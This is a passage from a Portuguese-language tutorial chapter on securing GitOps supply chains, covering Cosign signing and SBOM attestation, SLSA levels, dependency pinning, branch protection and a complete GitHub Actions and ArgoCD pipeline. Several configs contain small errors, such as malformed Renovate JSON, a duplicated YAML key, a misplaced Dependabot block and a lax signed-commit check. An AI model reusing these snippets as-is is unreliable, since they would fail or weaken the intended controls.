def attest_sbom(image: str, sbom_file: str, cert_identity: str, oidc_issuer: str):
    """Atesta o SBOM com Cosign"""
    print(f"[INFO] Atestando SBOM para: {image}")
    
    cmd = [
        "cosign", "attest",
        "--predicate", sbom_file,
        "--type", "spdxjson",
        "--yes",
        "--certificate-identity", cert_identity,
        "--certificate-oidc-issuer", oidc_issuer,
        image
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[ERROR] Falha ao atestar: {result.stderr}")
        raise SystemExit(1)
    
    print(f"[INFO] SBOM atestado com sucesso")


def verify_attestation(image: str, cert_identity: str, oidc_issuer: str) -> bool:
    """Verifica attestation de SBOM"""
    print(f"[INFO] Verificando attestation de: {image}")
    
    cmd = [
        "cosign", "verify-attestation",
        "--type", "spdxjson",
        "--certificate-identity", cert_identity,
        "--certificate-oidc-issuer", oidc_issuer,
        image
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[ERROR] Verificacao falhou: {result.stderr}")
        return False
    
    print(f"[INFO] Verificacao de attestation: OK")
    return True


def main():
    image = os.environ.get("IMAGE_NAME", "ghcr.io/myorg/myapp:latest")
    
    # Passo 1: Gerar SBOM
    sbom_file = generate_sbom(image)
    
    # Passo 2: Analisar SBOM
    analysis = analyze_sbom(sbom_file)
    
    # Passo 3: Atestar SBOM
    cert_identity = f"https://github.com/myorg/myapp/.github/workflows/build.yml@refs/heads/main"
    oidc_issuer = "https://token.actions.githubusercontent.com"
    
    attest_sbom(image, sbom_file, cert_identity, oidc_issuer)
    
    # Passo 4: Verificar
    if verify_attestation(image, cert_identity, oidc_issuer):
        print("\n[SUCCESS] Pipeline de attestacao completo!")
    else:
        print("\n[FAILURE] Verificacao de attestacao falhou!")
        raise SystemExit(1)


if __name__ == "__main__":
    main()
```

---

## 7. SLSA Framework

### 7.1 Niveis 0-4

```yaml
# Implementacao pratica de cada nivel SLSA
slsa_implementation:
  
  level_1:
    name: "Provenance Basica"
    implementation:
      tool: "slsa-verifier + GitHub Actions"
      effort: "Baixo"
      steps:
        - name: "Configurar GitHub Actions para gerar provenance"
          yaml: |
            name: Build with Provenance
            on: [push]
            permissions:
              id-token: write
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                outputs:
                  hashes: ${{ steps.hash.outputs.hashes }}
                steps:
                  - uses: actions/checkout@v4
                  - name: Build
                    run: make build
                  - name: Generate subject
                    id: hash
                    run: |
                      set -euo pipefail
                      find dist -type f -exec sha256sum {} \; | base64 -w0 > hashes.txt
                      echo "hashes=$(cat hashes.txt)" >> "$GITHUB_OUTPUT"
                    
          yaml: |
            provenance:
              enabled: true
              generator: |
                slsa-github-generator@v1.10.0
                
    verification: |
      slsa-verifier verify-image \
        --source-uri github.com/myorg/myapp \
        ghcr.io/myorg/myapp@sha256:abc123
```

{% raw %}
```yaml
  level_2:
    name: "Plataforma de Build Gerenciada"
    implementation:
      tool: "GitHub Actions com hosted runners"
      effort: "Medio"
      requirements:
        - "Usar GitHub Actions hosted runners (nao self-hosted)"
        - "Habilitar SLSA generator para GitHub Actions"
        - "Publicar provenance como attestation"
      yaml: |
        # GitHub Actions com SLSA L2
        name: Build and Sign (L2)
        on:
          push:
            branches: [main]
        permissions:
          id-token: write
          packages: write
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - name: Build
                run: make build
              - name: Containerize
                run: docker build -t ghcr.io/myorg/myapp:${{ github.sha }} .
              - name: Push
                run: docker push ghcr.io/myorg/myapp:${{ github.sha }}
              - name: Generate SLSA provenance
                uses: actions/slsa-github-generator@v1.10.0
                with:
                  base64-subjects: "${{ needs.build.outputs.hashes }}"
                  bundle: true
```
{% endraw %}

```yaml
  level_3:
    name: "Builds Isolados"
    implementation:
      tool: "Tekton Chains + SLSA Generator"
      effort: "Alto"
      requirements:
        - "Builds em ambiente isolado (sandbox)"
        - "Acesso restrito via pull request"
        - "Provenance gerada e assinada pela plataforma"
      yaml: |
        # Tekton Pipeline com SLSA L3
        apiVersion: tekton.dev/v1beta1
        kind: Pipeline
        metadata:
          name: secure-build
        spec:
          params:
            - name: git-url
              type: string
            - name: git-revision
              type: string
              
          workspaces:
            - name: source
            - name: shared-data
            
          tasks:
            - name: fetch-source
              taskRef:
                name: git-clone
              workspaces:
                - name: output
                  workspace: source
              params:
                - name: url
                  value: $(params.git-url)
                - name: revision
                  value: $(params.git-revision)
                  
            - name: run-tests
              taskRef:
                name: golang-test
              runAfter: ["fetch-source"]
              workspaces:
                - name: source
                  workspace: source
                  
            - name: build-image
              taskRef:
                name: kaniko
              runAfter: ["run-tests"]
              workspaces:
                - name: source
                  workspace: source
              params:
                - name: IMAGE
                  value: ghcr.io/myorg/myapp:$(params.git-revision)
                  
            - name: sign-image
              taskRef:
                name: cosign-sign
              runAfter: ["build-image"]
              params:
                - name: IMAGE
                  value: ghcr.io/myorg/myapp:$(params.git-revision)
                  
        ---
        # Chains config para SLSA L3
        apiVersion: operator.tekton.dev/v1alpha1
        kind: TektonChain
        metadata:
          name: chains
          namespace: tekton-pipelines
        spec:
          transparency: true
          transparency-url: https://rekor.sigstore.dev
          sign: cosign
          signing-secrets: sign-key
```

```yaml
  level_4:
    name: "Controle Humano"
    implementation:
      effort: "Muito Alto"
      requirements:
        - "Todos os niveis anteriores"
        - "Mudancas requerem revisao por maintainer diferente"
        - "Build completamente reproduzivel"
        - "Branch protection com required reviews"
      branch_protection: |
        # GitHub Branch Protection Rules
        apiVersion: github.com/v3
        rules:
          - pattern: main
            required_reviews: 2
            dismiss_stale_reviews: true
            require_code_owner_reviews: true
            require_status_checks: true
            required_status_checks:
              - "build"
              - "test"
              - "security-scan"
              - "sbom-generation"
            restrict_pushes: true
            push_actor_teams:
              - "platform-team"
```

### 7.2 Ferramentas por Nivel

```yaml
# Mapa de ferramentas por nivel SLSA
slsa_tooling:
  provenance_generation:
    - name: "SLSA GitHub Generator"
      url: "https://github.com/slsa-framework/slsa-github-generator"
      slsa_level: [1, 2, 3]
      
    - name: "Tekton Chains"
      url: "https://github.com/tektoncd/chains"
      slsa_level: [3, 4]
      
    - name: "Google Cloud Build Provenance"
      url: "https://cloud.google.com/build/docs/securing-builds"
      slsa_level: [1, 2, 3]
      
  provenance_verification:
    - name: "SLSA Verifier"
      url: "https://github.com/slsa-framework/slsa-verifier"
      command: "slsa-verifier verify-artifact"
      
  sbom_generation:
    - name: "Syft"
      url: "https://github.com/anchore/syft"
      formats: ["spdx-json", "cyclonedx", "spdx-tag-value"]
      
    - name: "trivy"
      url: "https://github.com/aquasecurity/trivy"
      formats: ["cyclonedx", "spdx"]
      
  sbom_verification:
    - name: "Cosign (attestations)"
      command: "cosign verify-attestation --type spdxjson"
      
  artifact_signing:
    - name: "Cosign (Sigstore)"
      url: "https://github.com/sigstore/cosign"
      
    - name: "Notary v2"
      url: "https://github.com/notaryproject/notary"
      
    - name: "crane (digest pinning)"
      url: "https://github.com/google/go-containerregistry"
```

---

## 8. Dependency Security

### 8.1 Estrategias de Pinning

```yaml
# Estrategias de pinning de dependencias
pinning_strategies:
  
  docker:
    good: "FROM golang:1.22.1-alpine@sha256:abc123..."
    bad: "FROM golang:latest"
    why: "Pin por digest SHA256 garante versao exata e integridade"
    
  python:
    good: |
      # requirements.txt com hashes
      requests==2.31.0 --hash=sha256:abc123...
      flask==3.0.0 --hash=sha256:def456...
    bad: "requests>=2.0"
    why: "Versao exata + hash previne substituicao"
    
  node:
    good: |
      # package.json com npm ci
      "dependencies": {
        "express": "4.18.2"
      }
    lock_file: "package-lock.json com integrity hashes"
    why: "npm ci usa lock file exato, npm install pode atualizar"
    
  go:
    good: |
      # go.mod com go.sum
      require (
        github.com/gin-gonic/gin v1.9.1
      )
    lock_file: "go.sum com checksums"
    why: "Go modules checksum database"
    
  java:
    good: |
      <!-- Maven: usar versao exata -->
      <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.21.1</version>
      </dependency>
    lock_file: "Maven Wrapper (mvnw) + dependency-lock"
    why: "Versao exata + lock file"
```

### 8.2 Dependabot/Renovate Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  # Dependencias de producao
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
    reviewers:
      - "platform-team"
    labels:
      - "dependencies"
      - "docker"
      
  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "platform-team"
      
  - package-ecosystem: "npm"
    directory: "/frontend"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "frontend-team"
      
  # Dependencias de GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5
    
  # Seguranca: priorizar updates de seguranca
  groups:
    security:
      patterns:
        - "*"
      update-types:
        - "minor"
        - "patch"
      schedule:
        interval: "daily"
```

```yaml
# renovate.json - Configuracao alternativa
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:recommended",
    ":securityAndFixes"
  ],
  "schedule": [
    "before 6am on Monday"
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": [
      "security"
    ],
    "automerge": false
  ],
  "packageRules": [
    {
      "matchUpdateTypes": [
        "minor",
        "patch"
      ],
      "automerge": true,
      "automergeType": "pr",
      "requiredStatusChecks": [
        "ci/build",
        "ci/test",
        "ci/security-scan"
      ]
    }
  ],
  "ignoreDeps": [
    "pinned-legacy-dependency"
  ]
}
```

### 8.3 Builds Reproduziveis

```yaml
# Dockerfile para build reproduzivel
FROM golang:1.22.1-alpine@sha256:abc123... AS builder

# Desabilitar cache do modulo
ENV GOFLAGS="-mod=readonly"
ENV CGO_ENABLED=0
ENV GOOS=linux
ENV GOARCH=amd64

# Copiar go.mod e go.sum primeiro (cache de dependencias)
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download

# Copiar codigo e compilar
COPY . .
RUN go build -trimpath -ldflags="-s -w" -o /app/server ./cmd/server

# Imagem final minima
FROM scratch

# Copiar binario
COPY --from=builder /app/server /server

# Copiar CA certificates (para HTTPS)
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/

# Executar
ENTRYPOINT ["/server"]
```

```yaml
# Verificacao de build reproduzivel
reproducible_build:
  verification: |
    # 1. Build local
    make build
    
    # 2. Calcular hash
    sha256sum dist/myapp > local-hash.txt
    
    # 3. Build em container limpo (CI)
    docker run --rm -v $(pwd):/src -w /src \
      golang:1.22.1-alpine \
      make build
    
    # 4. Comparar hashes
    docker run --rm -v $(pwd):/src -w /src \
      golang:1.22.1-alpine \
      sha256sum dist/myapp > ci-hash.txt
    
    # 5. Verificar igualdade
    diff local-hash.txt ci-hash.txt
    # Se igual, build e reproduzivel
    
  script: |
    #!/bin/bash
    # Script de verificacao de build reproduzivel
    set -euo pipefail
    
    HASH_LOCAL=$(sha256sum dist/myapp | awk '{print $1}')
    HASH_CI=$(sha256sum dist/myapp.ci | awk '{print $1}')
    
    if [ "$HASH_LOCAL" = "$HASH_CI" ]; then
      echo "BUILD REPRODUTIVEL: hashes iguais"
      echo "SHA256: $HASH_LOCAL"
      exit 0
    else
      echo "BUILD NAO REPRODUTIVEL: hashes diferentes"
      echo "Local: $HASH_LOCAL"
      echo "CI:    $HASH_CI"
      exit 1
    fi
```

---

## 9. Branch Protection

### 9.1 Configuracao Completa de Branch Protection

```yaml
# GitHub Branch Protection Rules
branch_protection:
  
  main_branch:
    rules:
      - pattern: main
        # Reviews obrigatorios
        required_reviews: 2
        dismiss_stale_reviews: true
        require_code_owner_reviews: true
        
        # Status checks obrigatorios
        require_status_checks: true
        require_branches_to_be_up_to_date: true
        required_status_checks:
          - "build"
          - "test" 
          - "lint"
          - "security-scan"
          - "sbom-generation"
          
        # Restricoes de push
        restrict_pushes: true
        push_actor_teams:
          - "platform-team"
        allow_force_pushes: false
        allow_deletions: false
        
        # Admins nao sao isentos
        enforce_admins: true
        
        # Required conversation resolution
        require_conversation_resolution: true
        
  # Branch protection para branches de release
  release_branches:
    rules:
      - pattern: "release/*"
        required_reviews: 1
        require_status_checks: true
        required_status_checks:
          - "test"
          - "security-scan"
        restrict_pushes: true
        push_actor_teams:
          - "release-team"
```

### 9.2 CODEOWNERS

```yaml
# .github/CODEOWNERS
codeowners:
  rules:
    - pattern: "*"
      owners:
        - "@myorg/platform-team"
        
    - pattern: "src/security/"
      owners:
        - "@myorg/security-team"
      description: "Revisao obrigatoria pelo time de seguranca para qualquer mudanca em codigo de seguranca"
      
    - pattern: "src/crypto/"
      owners:
        - "@myorg/security-team"
        - "@myorg/crypto-reviewers"
      description: "Revisao dupla obrigatoria para codigo criptografico"
      
    - pattern: "k8s/"
      owners:
        - "@myorg/platform-team"
      description: "Revisao do time de plataforma para manifests Kubernetes"
      
    - pattern: ".github/workflows/"
      owners:
        - "@myorg/platform-team"
        - "@myorg/security-team"
      description: "Revisao seguranca para pipelines de CI/CD"
      
    - pattern: "Dockerfile*"
      owners:
        - "@myorg/platform-team"
      description: "Revisao para Dockerfiles"
      
    - pattern: "Makefile"
      owners:
        - "@myorg/platform-team"
      description: "Revisao para Makefile"
```

### 9.3 CODEOWNERS com Validacao de Seguranca

```yaml
# GitHub Actions: Validacao de CODEOWNERS
name: Verify CODEOWNERS
on:
  pull_request:
    paths:
      - ".github/CODEOWNERS"
      
jobs:
  validate-codeowners:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Validate CODEOWNERS
        run: |
          # Verificar que teams de seguranca revisam workflows
          if ! grep -q ".github/workflows/.*security-team" .github/CODEOWNERS; then
            echo "ERRO: .github/workflows deve ter revisao do security-team"
            exit 1
          fi
          
          # Verificar que existe owners para diretoria critica
          if ! grep -q "src/security/.*security-team" .github/CODEOWNERS; then
            echo "ERRO: src/security/ deve ter revisao do security-team"
            exit 1
          fi
          
          echo "CODEOWNERS validado com sucesso"
```

---

## 10. Exemplo Completo: Secure GitOps Pipeline

### 10.1 Fluxo Completo

```yaml
# Pipeline completa: Git -> Build -> Sign -> Push -> Deploy -> Verify
complete_flow:
  stages:
    - stage: "Source"
      description: "Codigo fonte em repositorio Git com branch protection"
      tools: ["GitHub", "GitLab"]
      security:
        - "Branch protection com 2 reviews"
        - "CODEOWNERS obrigatorios"
        - "Status checks obrigatorios"
        - "Signed commits (GPG/SSH)"
        
    - stage: "Build"
      description: "Compilacao em ambiente isolado"
      tools: ["GitHub Actions", "Tekton"]
      security:
        - "Builds em runner isolado"
        - "Dependencias pinadas"
        - "Lock files verificados"
        - "SAST e SCA durante build"
        
    - stage: "Sign"
      description: "Assinatura de artefatos"
      tools: ["Cosign", "Sigstore"]
      security:
        - "Keyless signing com OIDC"
        - "Attestation de provenance"
        - "SBOM gerado e assinado"
        
    - stage: "Push"
      description: "Publicacao no registro de artefatos"
      tools: ["Docker Hub", "GHCR", "ECR"]
      security:
        - "Vulnerability scanning no registry"
        - "Image retention policies"
        - "Immutable tags"
        
    - stage: "Deploy"
      description: "Deploy via GitOps"
      tools: ["ArgoCD", "Flux"]
      security:
        - "Reconciliacao automatica"
        - "Policy enforcement (Kyverno)"
        - "Image signature verification"
        
    - stage: "Verify"
      description: "Verificacao pos-deploy"
      tools: ["Cosign", "SLSA Verifier"]
      security:
        - "Verificacao de assinatura antes do deploy"
        - "Health checks"
        - "Runtime monitoring"
```

### 10.2 GitHub Actions Completo

```yaml
# .github/workflows/secure-pipeline.yml
name: Secure GitOps Pipeline
on:
  push:
    branches: [main]
    
permissions:
  contents: read
  packages: write
  id-token: write
  security-events: write
  
env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}
  
jobs:
  # ============================================
  # STAGE 1: Source Validation
  # ============================================
  source-validation:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout with signed commits
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          
      - name: Verify signed commits
        run: |
          git log --format='%H %G?' | while read hash status; do
            if [ "$status" != "G" ] && [ "$status" != "U" ]; then
              echo "ERRO: Commit $hash nao assinado"
              exit 1
            fi
          done
          
  # ============================================
  # STAGE 2: Security Scanning
  # ============================================
  security-scan:
    runs-on: ubuntu-latest
    needs: source-validation
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          
      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'
          
  # ============================================
  # STAGE 3: Build
  # ============================================
  build:
    runs-on: ubuntu-latest
    needs: security-scan
    outputs:
      image-digest: ${{ steps.build-push.outputs.digest }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'
          
      - name: Run tests
        run: make test
        
      - name: Build binary
        run: |
          CGO_ENABLED=0 go build \
            -trimpath \
            -ldflags="-s -w" \
            -o dist/myapp \
            ./cmd/server
            
      - name: Setup Docker Buildx
        uses: docker/setup-buildx-action@v3
        
      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Build and push
        id: build-push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max
          
  # ============================================
  # STAGE 4: Generate SBOM
  # ============================================
  sbom:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Install Cosign
        uses: sigstore/cosign-installer@v3.5.0
        
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}
          format: spdx-json
          output-file: sbom.spdx.json
          
      - name: Attest SBOM
        run: |
          cosign attest \
            --predicate sbom.spdx.json \
            --type spdxjson \
            --yes \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/secure-pipeline.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}
            
  # ============================================
  # STAGE 5: Sign Image
  # ============================================
  sign:
    runs-on: ubuntu-latest
    needs: [build, sbom]
    steps:
      - name: Install Cosign
        uses: sigstore/cosign-installer@v3.5.0
        
      - name: Sign image
        run: |
          cosign sign \
            --yes \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/secure-pipeline.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}
            
  # ============================================
  # STAGE 6: Verify
  # ============================================
  verify:
    runs-on: ubuntu-latest
    needs: [build, sbom, sign]
    steps:
      - name: Install Cosign
        uses: sigstore/cosign-installer@v3.5.0
        
      - name: Verify signature
        run: |
          cosign verify \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/secure-pipeline.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}
            
      - name: Verify SBOM attestation
        run: |
          cosign verify-attestation \
            --type spdxjson \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/secure-pipeline.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}
            
      - name: Print verification summary
        run: |
          echo "=========================================="
          echo "VERIFICACAO DE SEGURANCA COMPLETA"
          echo "=========================================="
          echo "Imagem: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}"
          echo "Assinatura: VERIFICADA"
          echo "SBOM: VERIFICADO"
          echo "Provenance: VERIFICADA"
          echo "=========================================="
```

### 10.3 ArgoCD Application Segura

```yaml
# ArgoCD Application que verifica assinatura antes de deploy
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: myapp-production
  namespace: argocd
  annotations:
    # Forcar verificacao de imagem
    argocd.argoproj.io/hook: PreSync
spec:
  project: production
  
  source:
    repoURL: https://github.com/myorg/gitops-infra
    targetRevision: main
    path: clusters/production/myapp
    
  destination:
    server: https://kubernetes.default.svc
    namespace: production
    
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
      allowEmpty: false
    syncOptions:
      - CreateNamespace=true
      - PrunePropagationPolicy=foreground
      - PruneLast=true
      
  # Health checks
  ignoreDifferences:
    - group: apps
      kind: Deployment
      jsonPointers:
        - /spec/replicas
```

```yaml
# Deployment que requer verificacao de imagem
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      serviceAccountName: myapp
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
        
      containers:
        - name: myapp
          # Imagem pinada por SHA256 (garantido pelo GitOps)
          image: ghcr.io/myorg/myapp@sha256:abc123...
          
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
                
          resources:
            limits:
              memory: "256Mi"
              cpu: "500m"
            requests:
              memory: "128Mi"
              cpu: "250m"
              
          ports:
            - containerPort: 8080
              name: http
              
          livenessProbe:
            httpGet:
              path: /healthz
              port: http
            initialDelaySeconds: 5
            periodSeconds: 10
            
          readinessProbe:
            httpGet:
              path: /readyz
              port: http
            initialDelaySeconds: 3
            periodSeconds: 5
            
      # Seguranca: scheduler name customizado
      # schedulerName: gke-security-scheduler
      
      # Seguranca: topology spread constraints
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: kubernetes.io/hostname
          whenUnsatisfiable: DoNotSchedule
          labelSelector:
            matchLabels:
              app: myapp
```

---

## 11. Referencias

### 11.1 Documentacao Oficial

```yaml
referencias_oficiais:
  gitops:
    - name: "OpenGitOps"
      url: "https://opengitops.dev/"
      description: "Principios GitOps definidos pela CNCF"
      
    - name: "ArgoCD Documentation"
      url: "https://argo-cd.readthedocs.io/"
      description: "Documentacao oficial do ArgoCD"
      
    - name: "Flux Documentation"
      url: "https://fluxcd.io/docs/"
      description: "Documentacao oficial do Flux"
      
  supply_chain_security:
    - name: "SLSA Framework"
      url: "https://slsa.dev/"
      description: "Supply-chain Levels for Software Artifacts"
      
    - name: "Sigstore Documentation"
      url: "https://docs.sigstore.dev/"
      description: "Documentacao do Sigstore (Cosign, Rekor, Fulcio)"
      
    - name: "in-toto"
      url: "https://in-toto.io/"
      description: "Framework de attestations de supply chain"
      
    - name: "S2C2F"
      url: "https://github.com/ossf/s2c2f"
      description: "Secure Supply Chain Consumption Framework"
      
  vulnerability_scanning:
    - name: "Trivy"
      url: "https://trivy.dev/"
      description: "Scanner de vulnerabilidades universico"
      
    - name: "Grype"
      url: "https://github.com/anchore/grype"
      description: "Scanner de vulnerabilidades de imagens"
      
    - name: "Syft"
      url: "https://github.com/anchore/syft"
      description: "Gerador de SBOM"
```

### 11.2 Casos de Estudo e Incidentes

```yaml
casos_estudo:
  - name: "SolarWinds Sunburst"
    year: 2020
    url: "https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/"
    type: "Comprometimento de build pipeline"
    
  - name: "3CX Supply Chain Attack"
    year: 2023
    url: "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
    type: "Comprometimento de desenvolvedor"
    
  - name: "xz-utils Backdoor (CVE-2024-3094)"
    year: 2024
    url: "https://www.openwall.com/lists/oss-security/2024/03/29/4"
    type: "Social engineering de mantenedor"
    
  - name: "Codecov Bash Uploader"
    year: 2021
    url: "https://about.codecov.io/security-update/"
    type: "Comprometimento de script de build"
    
  - name: "event-stream npm"
    year: 2018
    url: "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident"
    type: "Mantenedor comprometido"
    
  - name: "ua-parser-js"
    year: 2021
    url: "https://github.com/nickthecook/ua-parser-js/issues/536"
    type: "Conta de mantenedor comprometida"
    
  - name: "Log4Shell"
    year: 2021
    cve: "CVE-2021-44228"
    url: "https://logging.apache.org/log4j/2.x/security.html"
    type: "Dependencia transitiva vulneravel"
```

### 11.3 Ferramentas e Projetos

```yaml
ferramentas:
  assinatura:
    - name: "Cosign"
      url: "https://github.com/sigstore/cosign"
      use: "Assinatura e verificacao de artefatos"
      
    - name: "Notary v2"
      url: "https://github.com/notaryproject/notary"
      use: "Assinatura de OCI artifacts"
      
  sbom:
    - name: "Syft"
      url: "https://github.com/anchore/syft"
      use: "Geracao de SBOM"
      
    - name: "SPDX Tools"
      url: "https://github.com/spdx/tools"
      use: "Ferramentas SPDX"
      
  vulnerability_scanning:
    - name: "Trivy"
      url: "https://github.com/aquasecurity/trivy"
      use: "Scanner de vulnerabilidades (containers, filesystem, repos)"
      
    - name: "Grype"
      url: "https://github.com/anchore/grype"
      use: "Scanner de vulnerabilidades de imagens"
      
  policy_enforcement:
    - name: "Kyverno"
      url: "https://kyverno.io/"
      use: "Politicas de seguranca para Kubernetes"
      
    - name: "OPA Gatekeeper"
      url: "https://open-policy-agent.github.io/gatekeeper/"
      use: "Politicas baseadas em Rego"
      
  provenance:
    - name: "SLSA Verifier"
      url: "https://github.com/slsa-framework/slsa-verifier"
      use: "Verificacao de provenance SLSA"
      
    - name: "in-toto"
      url: "https://in-toto.io/"
      use: "Framework de attestations"
```

---

## Resumo do Capitulo

```yaml
capitulo_resumo:
  topicos_cobertos:
    - "Fundamentos do GitOps e por que pull-based e mais seguro"
    - "Vetores de ataque na cadeia de suprimentos com casos reais"
    - "SLSA Framework e seus 4 niveis de seguranca"
    - "Configuracao segura do ArgoCD com RBAC e SSO"
    - "Flux v2 com image automation e policy enforcement"
    - "Assinatura de artefatos com Sigstore/Cosign"
    - "SBOM e attestations de provenance"
    - "Pinning de dependencias e builds reproduziveis"
    - "Branch protection e CODEOWNERS"
    - "Pipeline completa: Git -> Build -> Sign -> Push -> Deploy -> Verify"
    
  casos_de_estudo:
    - "SolarWinds (2020): Comprometimento de build pipeline"
    - "3CX (2023): Comprometimento de desenvolvedor"
    - "xz-utils (2024): Social engineering de mantenedor"
    - "Codecov (2021): Comprometimento de script de build"
    - "event-stream (2018): Mantenedor comprometido"
    - "ua-parser-js (2021): Conta de mantenedor comprometida"
    - "Log4Shell (2021): Dependencia transitiva vulneravel"
    
  principais_lições:
    - "Confie, mas verifique: todo artefato deve ser assinado e verificado"
    - "SBOM nao e opcional: visibilidade de dependencias e critica"
    - "Builds reproduziveis sao o gold standard de integridade"
    - "SLSA Level 3+ para artefatos criticos"
    - "Zero-trust na cadeia de suprimentos: trate cada dependencia como potencialmente comprometida"
```
